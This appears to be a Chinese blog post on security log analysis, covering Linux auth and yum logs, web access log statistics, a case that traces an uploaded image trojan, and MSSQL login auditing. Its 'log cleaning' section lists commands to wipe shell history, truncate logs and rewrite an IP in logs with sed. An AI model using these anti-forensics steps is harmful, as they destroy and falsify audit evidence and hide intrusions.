<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">1、定位有多少IP在爆破主机的root帐号：    </span><br><span class="line">grep &quot;Failed password for root&quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">定位有哪些IP在爆破：</span><br><span class="line">grep &quot;Failed password&quot; /var/log/secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c</span><br><span class="line"></span><br><span class="line">爆破用户名字典是什么？</span><br><span class="line"> grep &quot;Failed password&quot; /var/log/secure|perl -e &#x27;while($_=&lt;&gt;)&#123; /for(.*?) from/; print &quot;$1\n&quot;;&#125;&#x27;|uniq -c|sort -nr</span><br><span class="line"> </span><br><span class="line">2、登录成功的IP有哪些： 	</span><br><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $11&#125;&#x27; | sort | uniq -c | sort -nr | more</span><br><span class="line"></span><br><span class="line">登录成功的日期、用户名、IP：</span><br><span class="line">grep &quot;Accepted &quot; /var/log/secure | awk &#x27;&#123;print $1,$2,$3,$9,$11&#125;&#x27; </span><br><span class="line"></span><br><span class="line">3、增加一个用户kali日志：</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new group: name=kali, GID=1001</span><br><span class="line">Jul 10 00:12:15 localhost useradd[2382]: new user: name=kali, UID=1001, GID=1001, home=/home/kali</span><br><span class="line">, shell=/bin/bash</span><br><span class="line">Jul 10 00:12:58 localhost passwd: pam_unix(passwd:chauthtok): password changed for kali</span><br><span class="line">#grep &quot;useradd&quot; /var/log/secure </span><br><span class="line"></span><br><span class="line">4、删除用户kali日志：</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: delete user &#x27;kali&#x27;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed group &#x27;kali&#x27; owned by &#x27;kali&#x27;</span><br><span class="line">Jul 10 00:14:17 localhost userdel[2393]: removed shadow group &#x27;kali&#x27; owned by &#x27;kali&#x27;</span><br><span class="line"># grep &quot;userdel&quot; /var/log/secure</span><br><span class="line"></span><br><span class="line">5、su切换用户：</span><br><span class="line">Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0)</span><br><span class="line"></span><br><span class="line">sudo授权执行:</span><br><span class="line">sudo -l</span><br><span class="line">Jul 10 00:43:09 localhost sudo:    good : TTY=pts/4 ; PWD=/home/good ; USER=root ; COMMAND=/sbin/shutdown -r now</span><br></pre></td></tr></table></figure>

<p><strong>2、/var/log/yum.log</strong></p>
<p>软件安装升级卸载日志：</p>
<figure class="highlight plaintext"><figcaption><span>install gcc</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">yum install gcc</span><br><span class="line"></span><br><span class="line">[root@bogon ~]# more /var/log/yum.log</span><br><span class="line"></span><br><span class="line">Jul 10 00:18:23 Updated: cpp-4.8.5-28.el7_5.1.x86_64</span><br><span class="line">Jul 10 00:18:24 Updated: libgcc-4.8.5-28.el7_5.1.x86_64</span><br><span class="line">Jul 10 00:18:24 Updated: libgomp-4.8.5-28.el7_5.1.x86_64</span><br><span class="line">Jul 10 00:18:28 Updated: gcc-4.8.5-28.el7_5.1.x86_64</span><br><span class="line">Jul 10 00:18:28 Updated: libgcc-4.8.5-28.el7_5.1.i686</span><br></pre></td></tr></table></figure>

<h3 id="0x03-linux常用命令"><a href="#0x03-linux常用命令" class="headerlink" title="0x03 linux常用命令"></a>0x03 linux常用命令</h3><h4 id="find"><a href="#find" class="headerlink" title="find"></a>find</h4><p>find 命令用来在指定目录下查找文件。任何位于参数之前的字符串都将被视为欲查找的目录名。如果使用该命令时，不设置任何参数，则 find 命令将在当前目录下查找子目录与文件。并且将查找到的子目录和文件全部进行显示。</p>
<ul>
<li><p>将当前目录及其子目录下所有文件后缀为 .c 的文件列出来：</p>
<ul>
<li>find . -name “*.c“</li>
</ul>
</li>
<li><p>将当前目录及其子目录下所有最近 20 天内更新过的文件列出：</p>
<ul>
<li><p>find . -ctime 20</p>
</li>
<li><p>-amin n : 在过去 n 分钟内被读取过</p>
</li>
<li><p>-anewer file : 比文件 file 更晚被读取过的文件</p>
</li>
<li><p>-atime n : 在过去 n 天内被读取过的文件</p>
</li>
<li><p>-cmin n : 在过去 n 分钟内被修改过</p>
</li>
</ul>
</li>
</ul>
<h4 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h4><p>grep 命令用于查找文件里符合条件的字符串。grep 指令用于查找内容包含指定的范本样式的文件，如果发现某文件的内容符合所指定的范本样式，预设 grep 指令会把含有范本样式的那一列显示出来。若不指定任何文件名称，或是所给予的文件名为 -，则 grep 指令会从标准输入设备读取数据。</p>
<ul>
<li><p>从文件内容查找匹配指定字符串的行：</p>
<ul>
<li>grep “被查找的字符串” 文件名</li>
</ul>
</li>
<li><p>显示文件里匹配指定字串那行以及上下5行：</p>
<ul>
<li>grep -C 5 “被查找的字符串” 文件名</li>
</ul>
</li>
<li><p>从文件内容查找与正则表达式匹配的行：# $ grep –e “正则表达式” 文件名</p>
</li>
<li><p>grep -r ‘flag{‘ /</p>
</li>
</ul>
<p>egrep命令用于在文件内查找指定的字符串。egrep执行效果与”grep-E”相似，使用的语法及参数可参照grep指令，与grep的不同点在于解读字符串的方法。</p>
<ul>
<li>查找当前目录下包含字符串“Linux”的文件 ：<ul>
<li>egrep Linux *</li>
</ul>
</li>
</ul>
<h4 id="awk"><a href="#awk" class="headerlink" title="awk"></a>awk</h4><p>awk是一种处理文本文件的语言，是一个强大的文本分析工具。</p>
<ul>
<li><p>过滤第一列大于2的行：</p>
<ul>
<li>awk ‘$1&gt;2’ 文件名</li>
</ul>
</li>
<li><p>过滤第一列等于2的行：</p>
<ul>
<li>awk ‘$1==2 {print $1,$3}’文件名</li>
</ul>
</li>
<li><p>过滤第一列大于2并且第二列等于’Are’的行：</p>
<ul>
<li>awk ‘$1&gt;2 &amp;&amp; $2==”Are” {print $1,$2,$3}’文件名</li>
</ul>
</li>
<li><p>grep “Accepted “ /var/log/文件| awk ‘{print $1,$2,$3,$9,$11}’ </p>
</li>
</ul>
<h4 id="sed"><a href="#sed" class="headerlink" title="sed"></a>sed</h4><p>sed 命令是利用脚本来处理文本文件。sed 可依照脚本的指令来处理、编辑文本文件。Sed 主要用来自动编辑一个或多个文件、简化对文件的反复操作、编写转换程序等。</p>
<ul>
<li><p>sed 可以用行为单位进行部分数据的查找与替换：</p>
<ul>
<li>sed ‘s/要被取代的字串/新的字串/g’</li>
</ul>
</li>
<li><p>将 testfile 文件中每行第一次出现的 oo 用字符串 kk 替换，然后将该文件内容输出到标准输出：</p>
<ul>
<li>sed -e ‘s/oo/kk/‘ testfile</li>
</ul>
</li>
<li><p>删除历史操作记录，只保留前153行：</p>
<ul>
<li>sed -i ‘153,$d’ .bash_history</li>
</ul>
</li>
</ul>
<h3 id="0x04-linux系统状态检测"><a href="#0x04-linux系统状态检测" class="headerlink" title="0x04 linux系统状态检测"></a>0x04 linux系统状态检测</h3><h4 id="软件安装包"><a href="#软件安装包" class="headerlink" title="软件安装包"></a>软件安装包</h4><p>通过 rpm 自带的 -Va 来校验检查所有的 rpm 软件包，查看哪些命令是否被替换了</p>
<ul>
<li>rpm -Va &gt; rpm.log </li>
</ul>
<p>如果一切均校验正常将不会产生任何输出，如果有不一致的地方，就会显示出来，输出格式是8位长字符串，每个字符都用以表示文件与RPM数据库中一种属性的比较结果 ，如果是. (点) 则表示测试通过。 验证内容中的8个信息的具体内容如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">- S 文件大小是否改变 </span><br><span class="line">- M 文件的类型或文件的权限（rwx）是否被改变</span><br><span class="line">- 5 文件MD5校验是否改变（可以看成文件内容是否改变）</span><br><span class="line">- D 设备中，从代码是否改变 </span><br><span class="line">- L 文件路径是否改变 </span><br><span class="line">- U 文件的属主（所有者）是否改变 </span><br><span class="line">- G 文件的属组是否改变 </span><br><span class="line">- T 文件的修改时间是否改变</span><br></pre></td></tr></table></figure>

<h4 id="查看对外开放端口"><a href="#查看对外开放端口" class="headerlink" title="查看对外开放端口"></a>查看对外开放端口</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ss -tnlp</span><br><span class="line">ss -tnlp | grep ssh</span><br><span class="line">ss -tnlp | grep &quot;:22&quot;</span><br><span class="line">netstat -tnlp</span><br><span class="line">netstat -tnlp | grep ssh</span><br></pre></td></tr></table></figure>

<h4 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h4><ul>
<li><p>awk -F: ‘{if($3==0||$4==0)print $1}’ /etc/passwd </p>
<ul>
<li>查看 UID\GID 为0的帐号</li>
</ul>
</li>
<li><p>awk -F: ‘{if($7!=”/usr/sbin/nologin”)print $1}’ /etc/passwd </p>
<ul>
<li>查看能够登录的帐号</li>
</ul>
</li>
<li><p>lastlog</p>
<ul>
<li>系统中所有用户最近一次登录信息</li>
</ul>
</li>
<li><p>lastb </p>
<ul>
<li>显示用户错误的登录列表</li>
</ul>
</li>
<li><p>users </p>
<ul>
<li>打印当前登录的用户，每个用户名对应一个登录会话。如果一个用户不止一个登录会话，其用户名显示相同次数</li>
</ul>
</li>
</ul>
<h4 id="计划任务和启动项"><a href="#计划任务和启动项" class="headerlink" title="计划任务和启动项"></a>计划任务和启动项</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">没有安装</span><br><span class="line">chkconfig # 查看开机启动服务命令</span><br><span class="line">chkconfig --list | grep &quot;3:启用\|3:开\|3:on\|5:启用\|5:开\|5:on&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<ul>
<li><p>ls /etc/init.d </p>
<ul>
<li>查看开机启动配置文件命令</li>
</ul>
</li>
<li><p>runlevel </p>
<ul>
<li>查看运行级别命令ls /etc/rc.d/rc[0~6].d </li>
</ul>
</li>
<li><p>crontab -l</p>
<ul>
<li> 计划任务列表</li>
</ul>
</li>
<li><p>ls -alh /var/spool/cron </p>
<ul>
<li>默认编写的 crontab 文件会保存在 /var/spool/cron/用户名 下</li>
</ul>
</li>
<li><p>ls -al /etc/ | grep cron</p>
</li>
<li><p>ls -al /etc/cron*</p>
</li>
<li><p>cat /etc/crontab#查看定时任务</p>
<ul>
<li>如：*/1 * * * * echo “hello world” &gt;&gt; /tmp/test.txt 每分钟写入文件</li>
</ul>
</li>
<li><p>cat /etc/anacrontab</p>
</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">crontab -l   列出某个用户cron服务的详细内容</span><br><span class="line">Tips：默认编写的crontab文件会保存在 (/var/spool/cron/用户名 例如: /var/spool/cron/root</span><br><span class="line">crontab -r   删除每个用户cront任务(谨慎：删除所有的计划任务)</span><br><span class="line">crontab -e   使用编辑器编辑当前的crontab文件 </span><br></pre></td></tr></table></figure>



<h4 id="可疑文件"><a href="#可疑文件" class="headerlink" title="可疑文件"></a>可疑文件</h4><p>查看敏感目录，如/tmp目录下的文件，同时注意隐藏文件夹，以“..”为名的文件夹具有隐藏属性，针对可疑文件查看创建修改时间。</p>
<ul>
<li><p>find / -ctime -2 # 查找48小时内新增的文件</p>
</li>
<li><p>find ./ -mtime 0 -name “*.jsp” # 查找24小时内被修改的 JSP 文件</p>
</li>
<li><p>find / *.jsp -perm 4777 # 查找777的权限的jsp文件</p>
</li>
<li><p>ls -a /tmp # 查看临时目录</p>
</li>
<li><p>strings /usr/sbin/sshd | egrep ‘[1-9]{1,3}.[1-9]{1,3}.’ # 分析 sshd 文件，是否包括IP信息</p>
</li>
</ul>
<h3 id="0x05-linux日志清理"><a href="#0x05-linux日志清理" class="headerlink" title="0x05 linux日志清理"></a>0x05 linux日志清理</h3><ul>
<li><p>历史命令</p>
<ul>
<li><p>histroy -r #删除当前会话历史记录</p>
</li>
<li><p>history -c #删除内存中的所有命令历史</p>
</li>
<li><p>rm .bash_history #删除历史文件中的内容zsh_history </p>
</li>
<li><p>HISTZISE=0 #通过设置历史命令条数来清除所有历史记录</p>
</li>
</ul>
</li>
<li><p>日志文件</p>
<ul>
<li><p>完全删除日志文件（下面任意一个即可）</p>
<ul>
<li><p>cat /dev/null &gt; filename</p>
</li>
<li><p>: &gt; filename &gt; filename </p>
</li>
<li><p>echo “” &gt; filename </p>
</li>
<li><p>echo &gt; filename</p>
</li>
</ul>
</li>
</ul>
</li>
<li><p>删除当天日志</p>
<ul>
<li>sed -i ‘/当天日期/‘d filename</li>
</ul>
</li>
<li><p>篡改日志</p>
<ul>
<li><p>将所有170.170.64.17ip替换为127.0.0.1</p>
</li>
<li><p>sed -i ‘s/170.170.64.17/127.0.0.1/g’</p>
</li>
</ul>
</li>
</ul>
<h2 id="Web日志分析"><a href="#Web日志分析" class="headerlink" title="Web日志分析"></a>Web日志分析</h2><h3 id="ox01-Web日志"><a href="#ox01-Web日志" class="headerlink" title="ox01  Web日志"></a>ox01  Web日志</h3><p>Web访问日志记录了Web服务器接收处理请求及运行时错误等各种原始信息。通过对WEB日志进行的安全分析，不仅可以帮助我们定位攻击者，还可以帮助我们还原攻击路径，找到网站存在的安全漏洞并进行修复。</p>
<p>我们来看一条Apache的访问日志：</p>
<p><code>127.0.0.1 - - [11/Jun/2018:12:47:22 +0800] &quot;GET /login.html HTTP/1.1&quot; 200 786 &quot;-&quot; &quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36&quot;</code></p>
<p>通过这条Web访问日志，我们可以清楚的得知用户在什么IP、什么时间、用什么操作系统、什么浏览器的情况下访问了你网站的哪个页面，是否访问成功。</p>
<p>本文通过介绍Web日志安全分析时的思路和常用的一些技巧。</p>
<h3 id="0x02-日志分析技巧-1"><a href="#0x02-日志分析技巧-1" class="headerlink" title="0x02 日志分析技巧"></a>0x02 日志分析技巧</h3><p>在对WEB日志进行安全分析时，一般可以按照两种思路展开，逐步深入，还原整个攻击过程。</p>
<p>第一种：确定入侵的时间范围，以此为线索，查找这个时间范围内可疑的日志，进一步排查，最终确定攻击者，还原攻击过程。</p>
<p>第二种：攻击者在入侵网站后，通常会留下后门维持权限，以方便再次访问，我们可以找到该文件，并以此为线索来展开分析。</p>
<p>常用分析工具：</p>
<p>Window下，推荐用 EmEditor 进行日志分析，支持大文本，搜索效率还不错。</p>
<p>Linux下，使用Shell命令组合查询分析。</p>
<p>Shell+Linux命令实现日志分析，一般结合grep、awk等命令等实现了几个常用的日志分析统计技巧。</p>
<p>Apache日志分析技巧：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">1、列出当天访问次数最多的IP命令：</span><br><span class="line">cut -d- -f 1 log_file|uniq -c | sort -rn | head -20</span><br><span class="line"></span><br><span class="line">2、查看当天有多少个IP访问：</span><br><span class="line">awk &#x27;&#123;print $1&#125;&#x27; log_file|sort|uniq|wc -l</span><br><span class="line"></span><br><span class="line">3、查看某一个页面被访问的次数：</span><br><span class="line">grep &quot;/index.php&quot; log_file | wc -l</span><br><span class="line"></span><br><span class="line">4、查看每一个IP访问了多少个页面：</span><br><span class="line">awk &#x27;&#123;++S[$1]&#125; END &#123;for (a in S) print a,S[a]&#125;&#x27; log_file</span><br><span class="line"></span><br><span class="line">5、将每个IP访问的页面数进行从小到大排序：</span><br><span class="line">awk &#x27;&#123;++S[$1]&#125; END &#123;for (a in S) print S[a],a&#125;&#x27; log_file | sort -n</span><br><span class="line"></span><br><span class="line">6、查看某一个IP访问了哪些页面：</span><br><span class="line">grep ^111.111.111.111 log_file| awk &#x27;&#123;print $1,$7&#125;&#x27;</span><br><span class="line"></span><br><span class="line">7、去掉搜索引擎统计当天的页面：</span><br><span class="line">awk &#x27;&#123;print $12,$1&#125;&#x27; log_file | grep ^\&quot;Mozilla | awk &#x27;&#123;print $2&#125;&#x27; |sort | uniq | wc -l</span><br><span class="line"></span><br><span class="line">8、查看2018年6月21日14时这一个小时内有多少IP访问:</span><br><span class="line">awk &#x27;&#123;print $4,$1&#125;&#x27; log_file | grep 21/Jun/2018:14 | awk &#x27;&#123;print $2&#125;&#x27;| sort | uniq | wc -l	</span><br></pre></td></tr></table></figure>

<h3 id="0x03-日志分析案例"><a href="#0x03-日志分析案例" class="headerlink" title="0x03 日志分析案例"></a>0x03 日志分析案例</h3><p>Web日志分析实例：通过nginx代理转发到内网某服务器，内网服务器某站点目录下被上传了多个图片木马，虽然II7下不能解析，但还是想找出谁通过什么路径上传的。</p>
<p>在这里，我们遇到了一个问题：由于设置了代理转发，只记录了代理服务器的ip，并没有记录访问者IP？这时候，如何去识别不同的访问者和攻击源呢？</p>
<p>这是管理员日志配置不当的问题，但好在我们可以通过浏览器指纹来定位不同的访问来源，还原攻击路径。</p>
<p>1、定位攻击源</p>
<p>首先访问图片木马的记录，只找到了一条，由于所有访问日志只记录了代理IP，并不能通过IP来还原攻击路径，这时候，可以利用浏览器指纹来定位。</p>
<p><img src="/image/media/2022/secops/log-3-1.png"></p>
<p>浏览器指纹：</p>
<p><code>Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+.NET4.0C;+.NET4.0E)</code></p>
<p>2、搜索相关日志记录</p>
<p>通过筛选与该浏览器指纹有关的日志记录，可以清晰地看到攻击者的攻击路径。</p>
<p><img src="/image/media/2022/secops/log-3-2.png"></p>
<p>3、对找到的访问日志进行解读，攻击者大致的访问路径如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A、攻击者访问首页和登录页</span><br><span class="line">B、攻击者访问MsgSjlb.aspx和MsgSebd.aspx</span><br><span class="line">C、攻击者访问Xzuser.aspx</span><br><span class="line">D、攻击者多次POST（怀疑通过这个页面上传模块缺陷）</span><br><span class="line">E、攻击者访问了图片木马</span><br></pre></td></tr></table></figure>

<p>打开网站，访问Xzuser.aspx，确认攻击者通过该页面的进行文件上传了图片木马，同时，发现网站了存在越权访问漏洞，攻击者访问特定URL，无需登录即可进入后台界面。通过日志分析找到网站的漏洞位置并进行修复。</p>
<h3 id="0x04-日志统计分析技巧"><a href="#0x04-日志统计分析技巧" class="headerlink" title="0x04 日志统计分析技巧"></a>0x04 日志统计分析技巧</h3><p>统计爬虫：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -E <span class="string">&#x27;Googlebot|Baiduspider&#x27;</span>  /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log | awk <span class="string">&#x27;&#123; print $1 &#125;&#x27;</span> | sort | uniq</span><br></pre></td></tr></table></figure>

<p>统计浏览器：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log | grep -v -E <span class="string">&#x27;MSIE|Firefox|Chrome|Opera|Safari|Gecko|Maxthon&#x27;</span> | sort | uniq -c | sort -r -n | head -n <span class="number">100</span>		</span><br></pre></td></tr></table></figure>

<p>IP 统计：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&#x27;23/May/2019&#x27;</span> /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | awk -F<span class="string">&#x27;.&#x27;</span> <span class="string">&#x27;&#123;print $1&quot;.&quot;$2&quot;.&quot;$3&quot;.&quot;$4&#125;&#x27;</span> | sort | uniq -c | sort -r -n | head -n <span class="number">10</span></span><br><span class="line">   <span class="number">2206</span> <span class="number">219.136</span><span class="number">.134</span><span class="number">.13</span></span><br><span class="line">   <span class="number">1497</span> <span class="number">182.34</span><span class="number">.15</span><span class="number">.248</span></span><br><span class="line">   <span class="number">1431</span> <span class="number">211.140</span><span class="number">.143</span><span class="number">.100</span></span><br><span class="line">   <span class="number">1431</span> <span class="number">119.145</span><span class="number">.149</span><span class="number">.106</span></span><br><span class="line">   <span class="number">1427</span> <span class="number">61.183</span><span class="number">.15</span><span class="number">.179</span></span><br><span class="line">   <span class="number">1427</span> <span class="number">218.6</span><span class="number">.8</span><span class="number">.189</span></span><br><span class="line">   <span class="number">1422</span> <span class="number">124.232</span><span class="number">.150</span><span class="number">.171</span></span><br><span class="line">   <span class="number">1421</span> <span class="number">106.187</span><span class="number">.47</span><span class="number">.224</span></span><br><span class="line">   <span class="number">1420</span> <span class="number">61.160</span><span class="number">.220</span><span class="number">.252</span></span><br><span class="line">   <span class="number">1418</span> <span class="number">114.80</span><span class="number">.201</span><span class="number">.18</span>			</span><br></pre></td></tr></table></figure>

<p>统计网段：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | awk -F<span class="string">&#x27;.&#x27;</span> <span class="string">&#x27;&#123;print $1&quot;.&quot;$2&quot;.&quot;$3&quot;.0&quot;&#125;&#x27;</span> | sort | uniq -c | sort -r -n | head -n <span class="number">200</span>			</span><br></pre></td></tr></table></figure>

<p>统计域名：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat  /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log |awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>|sort|uniq -c|sort -rn|more		</span><br></pre></td></tr></table></figure>

<p>HTTP Status：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat  /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log |awk <span class="string">&#x27;&#123;print $9&#125;&#x27;</span>|sort|uniq -c|sort -rn|more</span><br><span class="line"><span class="number">5056585</span> <span class="number">304</span></span><br><span class="line"><span class="number">1125579</span> <span class="number">200</span></span><br><span class="line">   <span class="number">7602</span> <span class="number">400</span></span><br><span class="line">      <span class="number">5</span> <span class="number">301</span>	</span><br></pre></td></tr></table></figure>

<p>URL 统计：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat  /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log |awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span>|sort|uniq -c|sort -rn|more			</span><br></pre></td></tr></table></figure>

<p>文件流量统计：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log |awk <span class="string">&#x27;&#123;sum[$7]+=$10&#125;END&#123;for(i in sum)&#123;print sum[i],i&#125;&#125;&#x27;</span>|sort -rn|more</span><br><span class="line"></span><br><span class="line">grep <span class="string">&#x27; 200 &#x27;</span> /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log |awk <span class="string">&#x27;&#123;sum[$7]+=$10&#125;END&#123;for(i in sum)&#123;print sum[i],i&#125;&#125;&#x27;</span>|sort -rn|more			</span><br></pre></td></tr></table></figure>

<p>URL访问量统计：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | egrep <span class="string">&#x27;\?|&amp;&#x27;</span> | sort | uniq -c | sort -rn | more			</span><br></pre></td></tr></table></figure>

<p>脚本运行速度：</p>
<p>查出运行速度最慢的脚本</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -v <span class="number">0</span>$ /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log | awk -F <span class="string">&#x27;\&quot; &#x27;</span> <span class="string">&#x27;&#123;print $4&quot; &quot; $1&#125;&#x27;</span> web.<span class="property">log</span> | awk <span class="string">&#x27;&#123;print $1&quot; &quot;$8&#125;&#x27;</span> | sort -n -k <span class="number">1</span> -r | uniq &gt; <span class="regexp">/tmp/</span>slow_url.<span class="property">txt</span>			</span><br></pre></td></tr></table></figure>

<p>IP, URL 抽取：</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># tail -f /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log | grep <span class="string">&#x27;/test.html&#x27;</span> | awk <span class="string">&#x27;&#123;print $1&quot; &quot;$7&#125;&#x27;</span>			</span><br></pre></td></tr></table></figure>

<h2 id="MSSQL日志分析"><a href="#MSSQL日志分析" class="headerlink" title="MSSQL日志分析"></a>MSSQL日志分析</h2><p>常见的数据库攻击包括弱口令、SQL注入、提升权限、窃取备份等。对数据库日志进行分析，可以发现攻击行为，进一步还原攻击场景及追溯攻击源。</p>
<h3 id="0x01-MSSQL日志分析"><a href="#0x01-MSSQL日志分析" class="headerlink" title="0x01 MSSQL日志分析"></a>0x01 MSSQL日志分析</h3><p>首先，MSSQL数据库应启用日志记录功能，默认配置仅限失败的登录，需修改为失败和成功的登录，这样就可以对用户登录进行审核。</p>
<p><img src="/image/media/2022/secops/log-4-3.png"></p>
<p>登录到SQL Server Management Studio，依次点击 管理–SQL Server 日志</p>
<p><img src="/image/media/2022/secops/log-4-4.png"></p>
<p>双击日志存档文件即可打开日志文件查看器，并可以对日志进行筛选或者导出等操作。</p>
<p><img src="/image/media/2022/secops/log-4-5.png"></p>
<p>另外，MSSQ提供了一个工具SQL Server Profiler ，方便查找和发现SQL执行的效率和语句问题。</p>
<p><img src="/image/media/2022/secops/log-4-6.png"></p>
<p>日志分析案例：</p>
<p>在日志文件查看器中，选择筛选，在筛选设置中源设置为“登录”，应用筛选器，确定。</p>
<p><img src="/image/media/2022/secops/log-4-7.png"></p>
<p>筛选后的结果，可以很清晰的识别用户登录信息，记录内容包括用户登录时间、登录是否成功、登录使用的账号以及远程登录时用户使用的IP地址。</p>
<p>如下图：客户端：192.168.204.1进行尝试弱口令登录，并发现其中有一条登录成功的记录。</p>
<p><img src="/image/media/2022/secops/log-4-8.png"></p>
